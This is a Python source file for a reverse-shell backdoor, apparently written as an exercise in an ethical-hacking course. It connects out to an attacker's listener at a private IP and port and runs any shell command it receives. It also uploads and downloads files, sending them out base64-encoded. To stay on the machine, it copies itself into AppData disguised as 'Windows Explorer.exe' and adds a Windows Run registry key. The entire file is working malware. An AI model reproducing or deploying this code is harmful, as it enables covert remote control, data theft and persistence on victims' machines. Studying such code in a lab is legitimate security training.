#!/usr/bin/env python

# Use this to open socket and listen on attacking machine for connection from target:
# Netcut: nc -vv -l -p (port number) 
# OR
# use listener.py

import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    
    def __init__(self, ip, port):
        self.become_persistent()
        
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Arg1 = Target IP (Attacking machine)
        # Arg2 = Listening port on target IP
        # The connect method takes a tuple
        self.connection.connect((ip, port))        

    def reliable_send(self, data):
        # Converts data into json object
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                # Unwrapping the json object to original data
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory_to(self, path):

        # This function is needed to manually change the working directory as
        # subprocess.check_output() does not actually change the directory

        os.chdir(path)
        return ("[+] Changing working directory to : " + path)
              
    def read_file(self, file_path):
        # rb = read files as binary
        with open(file_path, "rb") as file:
            # Returning with base64 encoding, 
            # which converts unknown characters to known characters
            # that json and python can parse
            return base64.b64encode(file.read())

    def write_file(self, file_path, content):
        with open(file_path, "wb") as file:
            # Unwrapping base64 encoding and writting to file
            file.write(base64.b64decode(content))
            return ("[+] Upload successful!")

    def become_persistent(self):
        # Renaming file and providing location for file
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        
        # If file does not exist currently in evil_file_location then execute the code otherwise skip (Executed only once)
        if not os.path.exists(evil_file_location):
        
            # Copying evil file to evil_ file_location
            shutil.copyfile(sys.executable, evil_file_location)
        
            # Adding registry entry in the OS for persistent attack
            subprocess.call('reg add HKCU\Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def run(self):
        while True:
            # 1024 is the buffer size for received data
            command = self.reliable_receive()
            
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                
                # Change working directory
                elif command[0] == "cd" and (len(command) > 1):
                    command_result = self.change_working_directory_to(command[1])
                
                # Download file
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                    
                # Upload file
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                    
                # Execute command
                else:
                    # This line still works because this calls the method 
                    # that implements the subprocess.check_output function, which can take
                    # a string or a list of strings as arguments.    
                    command_result = self.execute_system_command(command)
            
            except Exception:
                command_result = "[-] Error"
            
            self.reliable_send(command_result)
  
try:      
    my_backdoor = Backdoor("192.168.56.101", 5555)
    my_backdoor.run()
except Exception:
    sys.exit()